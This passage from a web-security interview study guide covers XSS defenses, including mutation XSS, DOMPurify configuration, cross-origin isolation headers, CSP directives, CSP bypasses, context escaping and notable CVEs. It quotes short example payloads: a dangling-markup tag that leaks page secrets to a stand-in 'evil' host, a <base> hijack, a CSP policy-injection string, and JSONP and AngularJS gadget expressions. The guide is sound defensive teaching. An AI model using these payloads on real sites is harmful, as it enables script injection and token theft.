  `<textarea>`, `<xmp>`) where the parser's tokenizer state differs from the sanitizer's
  assumptions.
- **`<template>`** content lives in an inert document fragment; moving it into the live DOM
  can re-interpret it.
- DOM **normalization** (adding implied `<tbody>`, closing tags, entity decoding) reshaping
  the tree on reinsertion.

The current reference is Mizu's 2024 "Exploring the DOMPurify library: Bypasses and Fixes"
(PortSwigger's Top 10 Web Hacking Techniques of 2024, #5), which chained namespace-confusion
mutations to bypass then-current DOMPurify. Historic groundwork is Heiderich et al.'s mXSS
papers and the cure53 DOMPurify security wiki.

Defenses: use a **maintained** sanitizer and keep it patched (mXSS bypasses are found and
fixed regularly — patch hygiene is the control); sanitize **once** and never mutate the
string afterward; prefer Trusted Types so raw strings can't reach `innerHTML` at all; and
avoid round-tripping sanitized HTML through `innerHTML`/`outerHTML` again.

> [!WARNING]
> Re-sanitizing or "cleaning up" HTML *after* DOMPurify (e.g. string-replacing, appending,
> or re-parsing its output) can **void** the sanitization — the post-processing may re-open
> a mutation the sanitizer had neutralized. Assign the sanitizer's output straight to the
> sink (ideally as a `TrustedHTML`) with no further edits.

## Configuring an HTML Sanitizer (DOMPurify)

Knowing *that* you should use DOMPurify is junior-level; configuring it correctly is the
senior bar. Key knobs (client-side DOMPurify):
- `ALLOWED_TAGS` / `ALLOWED_ATTR` — explicit allowlists; `FORBID_TAGS` / `FORBID_ATTR`
  subtract from defaults. Prefer a tight allowlist over blocklists.
- `USE_PROFILES: { html: true }` (or `svg`/`mathML`) — enabling a profile **overrides**
  `ALLOWED_TAGS`, a common footgun when you also try to set `ALLOWED_TAGS`.
- `RETURN_TRUSTED_TYPE: true` — returns a `TrustedHTML` object for Trusted Types
  integration. DOMPurify then auto-creates a Trusted Types policy named `dompurify`, which
  **must be listed** in your CSP `trusted-types` directive or the call throws.
- `SANITIZE_NAMED_PROPS: true` — namespaces `id`/`name` (`user-content-` prefix) to kill DOM
  clobbering.
- Hooks (`addHook('uponSanitizeElement', …)`) for custom element/attribute policy.

Operational pitfalls:
- **Don't modify HTML after sanitizing** (see mXSS warning above) — it voids the guarantee.
- **Server-side rendering:** DOMPurify needs a DOM. With `jsdom` you must keep it patched
  (it has had its own bypasses); **`happy-dom` is not safe** for sanitization. Prefer a
  browser/`jsdom` build and pin versions.
- `SAFE_FOR_XML` defaults to `true`; setting it `false`, or sanitizing for a non-HTML
  context (e.g. output later placed in XML/XHTML) without matching config, can reintroduce
  XSS.
- Use `USE_PROFILES`/`ALLOWED_URI_REGEXP` to constrain `href`/`src` schemes; DOMPurify
  blocks `javascript:` by default but confirm your config didn't loosen it.

> [!KEY-TAKEAWAY]
> "Just call `DOMPurify.sanitize(x)`" is incomplete. The senior answer names a tight
> allowlist, `RETURN_TRUSTED_TYPE` wired to a CSP `trusted-types dompurify` entry,
> `SANITIZE_NAMED_PROPS` for clobbering, a patched DOM implementation server-side, and the
> rule that sanitizer output is never post-processed.

## Cross-Origin Isolation: COOP, COEP, and CORP

Three response headers harden the boundary between your document and other origins,
defeating Spectre-style side channels, cross-site leaks (XS-Leaks), and cross-site script
inclusion (XSSI).

- **`Cross-Origin-Opener-Policy` (COOP)** — controls whether a document shares a browsing-
  context group with pages that open it or that it opens.
  - `unsafe-none` (default), `same-origin-allow-popups`, `same-origin`.
  - `COOP: same-origin` **severs `window.opener`**, so a page you `window.open()` (or that
    opened you) cannot reach back into your window — this closes reverse-tabnabbing and many
    XS-Leaks and cross-window scripting paths.
- **`Cross-Origin-Embedder-Policy` (COEP)** — `require-corp` or `credentialless` forces
  every cross-origin subresource to explicitly opt in (via CORP/CORS) before it can be
  embedded.
- **`Cross-Origin-Resource-Policy` (CORP)** — a *per-resource* header
  (`same-origin` | `same-site` | `cross-origin`) that says who may embed *this* response.
  `CORP: same-origin` blocks other sites from loading your resource into `<img>`/`<script>`
  etc., mitigating XSSI and side-channel leaks.

**Crossorigin isolation:** serving `COOP: same-origin` **and** `COEP: require-corp` makes
`self.crossOriginIsolated === true`, which **re-enables** the high-precision capabilities
browsers locked down after Spectre: `SharedArrayBuffer`, unthrottled `performance.now()`,
and `performance.measureUserAgentSpecificMemory()`. These are the primary reason to adopt
COOP+COEP beyond hardening.

> [!INTERVIEW]
> "Name security headers beyond CSP that mitigate Spectre / cross-origin leaks." COOP
> (`same-origin` — isolate the browsing-context group, kill `window.opener`), COEP
> (`require-corp` — require opt-in for embeds), and CORP (`same-origin` per resource).
> COOP+COEP together grant cross-origin isolation and unlock `SharedArrayBuffer`.

## Advanced CSP Source Expressions

Beyond `'unsafe-inline'`, nonces, hashes, and `'strict-dynamic'`, CSP Level 3 adds finer
controls interviewers probe:

- **`'unsafe-hashes'`** — allows specific **inline event-handler / style attributes**
  (`onclick="…"`, `style="…"`) to run *by hash*, without enabling all inline script:
  `script-src 'unsafe-hashes' 'sha256-…'`. It is the correct (least-bad) answer to "I have
  one legacy `onclick` I can't remove under strict CSP." The trap: it is strictly weaker
  than removing the handler and does **not** equal `'unsafe-inline'` — it only whitelists the
  exact hashed handler bodies. Prefer refactoring the handler out entirely.
- **`script-src-elem` vs `script-src-attr`** — `-elem` governs `<script>` *elements* (inline
  blocks and `src` loads); `-attr` governs inline event-handler *attributes*. Likewise
  **`style-src-elem`** (`<style>`/`<link rel=stylesheet>`) vs **`style-src-attr`** (inline
  `style=` attributes). If unset they fall back to `script-src`/`style-src`, then
  `default-src`. This granularity lets you, e.g., allow nonced `<script>` elements while
  fully banning inline handlers with `script-src-attr 'none'`.

> [!TIP]
> `script-src-attr 'none'` is a clean way to guarantee **no** inline event handlers run,
> independent of how `script-src` is configured — a strong hardening add for apps migrating
> off legacy `onclick=` markup.

## CSP Bypasses: Dangling Markup, Policy Injection, and Script Gadgets

A CSP can pass `csp-evaluator` and still be bypassable. Senior candidates should name the
mechanisms:

- **Script gadgets** (Lekies et al., "Code-Reuse Attacks for the Web," 2017). Legitimate
  code already loaded from an allowed/nonced/`strict-dynamic`-trusted origin turns benign
  *injected HTML* into execution. Examples: a **JSONP** endpoint (`?callback=alert(1)`) on an
  allowlisted CDN; **AngularJS** template-expression evaluation
  (`{{constructor.constructor('alert(1)')()}}`) or auto-init via `ng-app`; any framework that
  scans the DOM for markup it will "activate." Gadgets defeat allowlist CSP *and* even
  survive some sanitizers (the injected markup contains no script — the gadget supplies it).
  This is the deeper "why allowlists are dead → use `strict-dynamic`" reason, and why even
  `strict-dynamic` bundles must be gadget-audited.
- **Dangling-markup injection / exfiltration.** When CSP blocks script but allows
  `img-src`/`connect-src`, an attacker injects an *unterminated* tag —
  `<img src='//evil/log?` or a dangling `<a href>`/`<link>` — so the browser treats the rest
  of the page (CSRF tokens, secrets, nonces) as the attribute value and **sends it to the
  attacker host** when it fetches the resource. CSP alone doesn't stop this; `img-src 'self'`
  helps but other vectors (anchors, `<meta http-equiv=refresh>`, `<link>` prefetch) remain.
  The real fix is fixing the HTML injection.
- **CSP policy injection.** If reflected user input lands *inside the CSP header itself*, an
  attacker appends a directive that overrides the intended one — e.g. injecting
  `; script-src-elem 'unsafe-inline'` overrides the base `script-src` and re-enables inline
  script. Never build CSP from untrusted input.
- **DOM-clobbering `base-uri`.** If `base-uri 'none'` is missing, an injected `<base
  href="//evil/">` rewrites relative URLs — including a nonced but relatively-referenced
  `<script src="app.js">` — to load the attacker's file with the page's trust. This is why
  `base-uri 'none'` is a required hardening directive.

> [!INTERVIEW]
> "This CSP scores well in csp-evaluator but is still bypassable — how?" Strong answers:
> script gadgets on `strict-dynamic`-trusted bundles (JSONP/AngularJS), a missing
> `base-uri 'none'` enabling `<base>` hijack of relative nonced scripts, or dangling-markup
> exfiltration through an allowed `img-src`/`connect-src`. CSP is mitigation, not a cure for
> the injection.

## sandbox, upgrade-insecure-requests, and Mixed Content

- **`Content-Security-Policy: sandbox`** applies iframe-style sandboxing to the *response
  itself*. An empty `sandbox` (no tokens) is maximum restriction — the document runs as an
  opaque, unique origin with scripts, forms, popups, and same-origin access disabled. Add
  tokens back as needed: `allow-scripts`, `allow-forms`, `allow-popups`, `allow-same-origin`,
  `allow-modals`, etc. Use it to serve untrusted content (user uploads, previews,
  attachments) with minimal capability. Note `allow-scripts` + `allow-same-origin` together
  lets the content remove its own sandbox, so avoid granting both to untrusted docs.
- **`upgrade-insecure-requests`** (valueless directive) tells the browser to auto-upgrade
  `http://` subresource and same-origin navigation URLs to `https://` before fetching. It
  fixes mixed-content breakage during an HTTPS migration but is **not** a substitute for
  HSTS: it doesn't upgrade cross-origin top-level navigations and offers no protection if the
  attacker controls the network for the first request.
- **`block-all-mixed-content`** (deprecated in favor of upgrade) blocked all mixed content.
  Modern browsers auto-block active mixed content regardless.

## Modern Reporting API: Reporting-Endpoints and NEL

CSP reporting has modernized. `Report-To` is superseded by the **`Reporting-Endpoints`**
response header (Reporting API v1), referenced from CSP by the **`report-to <group>`**
directive:
```
Reporting-Endpoints: csp-endpoint="https://example.com/csp"
Content-Security-Policy: script-src 'nonce-…'; report-to csp-endpoint
```
`report-uri` is deprecated in CSP3 but still honored, so pages often send **both**
`report-uri` and `report-to` for coverage. The **`'report-sample'`** source keyword tells
the browser to include a short snippet of the offending inline script in the violation
report (helps triage). **NEL (Network Error Logging)** is the sibling mechanism that reports
network-layer failures (DNS, TLS, connection) via the same Reporting API endpoints.

## JavaScript and JSON Context Escaping

Encoding rules inside a `<script>` block are stricter than the summary table implies:
- Inside a quoted JS string literal, escape with **`\uXXXX`** (Unicode) or `\xHH`, and
  **crucially also encode `<`, `>`, and `&`**. The reason: the HTML parser runs *before* the
  JS lexer, so a literal `</script>` inside your string still **terminates the script
  element** (`</script>` → `<\/script>` or `</script>`), and `<!--`/`<script` sequences
  trigger legacy comment/script-data parsing quirks. Backslash-escaping only the quotes is
  insufficient.
- Prefer emitting data **not** as a raw JS literal at all: serialize as JSON and read it via
  `JSON.parse('…')`, or stash it in a `data-*` attribute / a
  `<script type="application/json">` island and parse it with safe DOM APIs.
- **JSON embedded in HTML `<script>`:** HTML-encode `<`, `>`, `&`, and the JS-invalid line
  terminators **U+2028 / U+2029** (`<`, ` `, …). U+2028/U+2029 are valid in JSON
  but were illegal in JS string literals pre-ES2019 and still break older parsers, and `<`
  enables `</script>` breakout.
- **XSSI / JSON hijacking:** top-level JSON *arrays* were historically executable via
  `<script>` include + overridden `Array` constructor; APIs prepend an anti-hijacking prefix
  like `)]}',\n` or `while(1);` (stripped client-side) and require `nosniff` + correct
  `Content-Type` to prevent cross-origin script inclusion of JSON.

> [!WARNING]
> HTML-encoding a value that lands inside `<script>var x='…'</script>` does **not** make it
> safe — the value is in a JS string context, not an HTML context. The `</script>` closing
> sequence and unescaped quotes/backslashes remain breakout vectors. Emit via `JSON.parse`
> or a data island instead of hand-escaping into a script literal.

## Nonces, Caching, and CDN Interaction

Nonces and full-page caching are fundamentally at odds. A CSP nonce must be **fresh and
unpredictable per response**; if a full HTML page (header + inline `<script nonce>`) is
cached by a CDN and served to many users, the "nonce" is now static and public — an
attacker reads it from the cached HTML and reuses it, making the policy worthless.
Resolutions:
- **Edge/middleware nonce injection:** generate the nonce at the edge per request and
  rewrite both the header and the tags (some CDNs/edge workers support this).
- **Hash-based CSP** for static/cacheable pages: pin the exact inline script bytes with
  `'sha256-…'` — no per-request state, cache-friendly.
- Avoid naïve middleware that stamps a nonce onto **every** `<script>` in the output,
  including ones built from user data — that would re-bless an injected script. Nonces must
  be applied only to *known-trusted* server-authored tags.

> [!KEY-TAKEAWAY]
> Nonce CSP ⇒ per-response dynamic HTML; cached/static/CDN-served HTML ⇒ hash CSP (or
> per-request edge nonce injection). A cached nonce is a reused nonce, and a reused nonce is
> no protection at all.

## Self-XSS, javascript:/data: URLs, and Reverse Tabnabbing

- **Self-XSS** is social engineering, not a code flaw: the attacker tricks a user into
  pasting attacker-supplied JavaScript into their own DevTools console ("paste this to unlock
  a feature"). It runs in the victim's session but there is no injection point in the app, so
  **output encoding cannot fix it** — browsers now print a large console warning, and the
  defenses are user education, framing/UX, and not exposing "paste code here" affordances.
- **`javascript:` and `data:` URLs.** Assigning a `javascript:` (or in some sinks a
  `data:text/html`) URL to `href`/`src`/`location`/`window.open` executes script. Frameworks
  don't fully protect this: React, for instance, "cannot handle `javascript:` URLs without
  specialized validation." Fix by **scheme-allowlisting** URL attributes — permit only
  `https:`/`http:`/`mailto:`/relative and reject everything else *before* it reaches the
  attribute.
- **Reverse tabnabbing.** A link with `target="_blank"` gives the opened page a live
  `window.opener` it can use to redirect your tab to a phishing page. Add
  `rel="noopener noreferrer"` (modern browsers imply `noopener` for `target="_blank"`, but
  set it explicitly) — or, at the document level, `Cross-Origin-Opener-Policy: same-origin`.

## DoubleClickjacking and the Limits of Framing Defenses

`frame-ancestors`/`X-Frame-Options` stop an attacker from *framing* your site, and SameSite
cookies blunt cross-site request forgery — but neither is a complete clickjacking answer.
**DoubleClickjacking** (Paulos Yibelo, 2024) is a UI-redressing variant that **bypasses
frame-busting and SameSite** by exploiting the timing between a rapid double-click and a
window swap: the attacker opens a popup, and between the user's `mousedown`/`mouseup` events
closes it and swaps the underlying (already-authenticated, top-level, *unframed*) target
window under the second click — so the victim's second click lands on a sensitive control
(OAuth "Authorize," "Delete account"). Because the target is a top-level window (not an
iframe) and the navigation is a same-site top-level context, `frame-ancestors` and SameSite
don't engage.

Mitigations go beyond framing headers: disable security-critical buttons until a gesture/
short delay after focus, require an explicit non-double-click confirmation for high-value
actions, and use COOP to sever `window.opener`.

## Notable CVEs and Incidents

- **CVE-2024-4367 — PDF.js arbitrary JS execution.** A missing type check in Mozilla's
  widely-embedded `pdf.js` let a crafted font (`glyf`/font-matrix field) execute arbitrary
  JavaScript in the origin embedding the viewer. It illustrates **second-order / supply-chain
  XSS**: a vulnerability in an embedded rendering library becomes XSS in *your* app, and
  patch hygiene / dependency scanning is the control. (PortSwigger Top 10 2024, #7.)
- **DOMPurify version-specific mXSS bypasses.** Recurring namespace-confusion bypasses
  (Mizu 2024 and predecessors) are fixed release-by-release — the lesson is pin-and-patch,
  not "DOMPurify is bulletproof."
- **DoubleClickjacking** (2024) — see above; PortSwigger Top 10 2024 #6.
- **Samy worm** (MySpace, 2005) — the canonical self-propagating stored-XSS worm; ~1M
  profiles in ~20 hours, driven by a CSS/JS filter bypass and an XHR that reposted the
  payload.
- **AngularJS/JSONP gadget CVEs** on allowlisted CDNs — the empirical basis for the "CSP Is
  Dead" allowlist critique.

> [!INTERVIEW]
> "Strict CSP is deployed, but the React SPA reads a bearer token from `localStorage` — does
> CSP save you?" No. CSP restricts script *sources/execution*; it does not stop DOM-XSS from
> reading same-origin `localStorage` (you'd need Trusted Types to close the DOM sinks), and
> `connect-src 'self'` won't stop exfiltration routed through your own origin (open redirect,
> a gadget, or the token echoed to a same-origin endpoint the attacker controls output of).
> This is the crux of the HttpOnly-cookie vs `localStorage` token debate.

## Common follow-up questions

- "Walk me through fixing a reflected XSS in a search box." Identify the sink (value
  echoed into HTML body/attribute), apply context-aware output encoding via the framework's
  auto-escaping, add a nonce-based CSP as defense in depth, and add a regression test with
  a payload like `"><script>`.
- "Reflected vs stored vs DOM XSS — which is worst and why?" Stored (no lure needed,
  hits every viewer, wormable). DOM-based is sneakiest (never touches the server, hides in
  the URL fragment). Reflected needs a lured click.
- "Why isn't input validation enough?" Same value renders into multiple contexts;
  legitimate data contains dangerous chars; blocklists are bypassable. Encode on output.
- "How does CSP actually stop XSS if the script is already injected?" It blocks
  *execution*: inline scripts without the right nonce/hash, and scripts from disallowed
  origins, don't run. It doesn't fix the injection.
- "Why is a host-allowlist CSP considered weak?" JSONP endpoints and framework gadgets
  on allowlisted CDNs let attackers run code from allowed origins; use nonce +
  strict-dynamic.
- "Nonce vs hash?" Nonce = fresh per-response random for dynamic server-rendered pages;
  hash = fixed digest of static inline scripts, cache-friendly.
- "If cookies are HttpOnly, is XSS harmless?" No — the attacker can't read the cookie
  but can still make authenticated requests in-page and do everything the user can.
- "Which headers would you set on a hardened app?" CSP (nonce + strict-dynamic +
  object-src 'none' + base-uri 'none' + frame-ancestors), HSTS (+ preload), nosniff,
  Referrer-Policy, X-Frame-Options (legacy fallback), Permissions-Policy, and Trusted
  Types.
- "What is mutation XSS (mXSS)?" Sanitized HTML that the browser's parser mutates on
  reinsertion into a form that becomes executable — why you use a maintained sanitizer,
  not regexes.
- "The sanitizer strips `<script>` and all handlers — get code execution." DOM
  clobbering (inject `id`/`name` to hijack a script `src` or a config global) or mXSS via
  SVG/MathML namespace confusion.
- "Which headers give cross-origin isolation, and what do they unlock?" COOP
  `same-origin` + COEP `require-corp` ⇒ `crossOriginIsolated` ⇒ `SharedArrayBuffer` and
  high-res timers; CORP guards each resource against cross-site embedding.
- "One legacy `onclick` must stay under strict CSP — how?" `'unsafe-hashes'` with the
  handler's hash (weaker than removing it; refactor it out when you can).
- "CSP blocks script but you can still exfiltrate the CSRF token — how?"
  Dangling-markup injection to an allowed `img-src`/`connect-src` host.
- "Nonce vs cached CDN pages?" A cached nonce is reusable and worthless; use hash-based
  CSP or per-request edge nonce injection.

## References

- OWASP Top 10 2021 — A03:2021 Injection: https://owasp.org/Top10/A03_2021-Injection/
- OWASP Cross Site Scripting (XSS): https://owasp.org/www-community/attacks/xss/
- OWASP Cheat Sheet — Cross Site Scripting Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet — DOM based XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet — Content Security Policy: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- OWASP Cheat Sheet — HTTP Security Response Headers: https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
- OWASP Cheat Sheet — Clickjacking Defense: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
- OWASP WSTG — Testing for XSS: https://owasp.org/www-project-web-security-testing-guide/
- W3C Content Security Policy Level 3: https://www.w3.org/TR/CSP3/
- W3C Trusted Types: https://w3c.github.io/trusted-types/dist/spec/
- Weichselbaum et al., "CSP Is Dead, Long Live CSP" (ACM CCS 2016): https://research.google/pubs/pub45542/
- RFC 6797 — HTTP Strict Transport Security (HSTS): https://www.rfc-editor.org/rfc/rfc6797
- RFC 6265 — HTTP State Management (Cookies, HttpOnly): https://www.rfc-editor.org/rfc/rfc6265
- MDN — Referrer-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
- MDN — Permissions-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
- MDN — X-Content-Type-Options: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
- W3C Reporting API / report-to: https://www.w3.org/TR/reporting-1/
- OWASP Cheat Sheet — DOM Clobbering Prevention: https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
- OWASP ASVS v4/v5 — V5 Validation, Sanitization & Encoding; V14 Configuration: https://owasp.org/www-project-application-security-verification-standard/
- Lekies, Kotowicz et al., "Code-Reuse Attacks for the Web / Script Gadgets" (ACM CCS 2017): https://research.google/pubs/pub46215/
- Mizu, "Exploring the DOMPurify library: Bypasses and Fixes" (2024): https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
- cure53 DOMPurify (security wiki, mXSS): https://github.com/cure53/DOMPurify
- Heiderich et al., mXSS research ("mXSS Attacks: Attacking well-secured Web-Applications", CCS 2013): https://cure53.de/fp170.pdf
- Paulos Yibelo, "DoubleClickjacking" (2024): https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html
- CVE-2024-4367 — PDF.js arbitrary JavaScript execution: https://nvd.nist.gov/vuln/detail/CVE-2024-4367
- MDN — Cross-Origin-Opener-Policy / Embedder-Policy / Resource-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy
- MDN — Cross-origin isolation / crossOriginIsolated: https://developer.mozilla.org/en-US/docs/Web/API/Window/crossOriginIsolated
- W3C Fetch Standard (CORP): https://fetch.spec.whatwg.org/
- WHATWG HTML — COOP/COEP: https://html.spec.whatwg.org/multipage/browsers.html#cross-origin-opener-policies
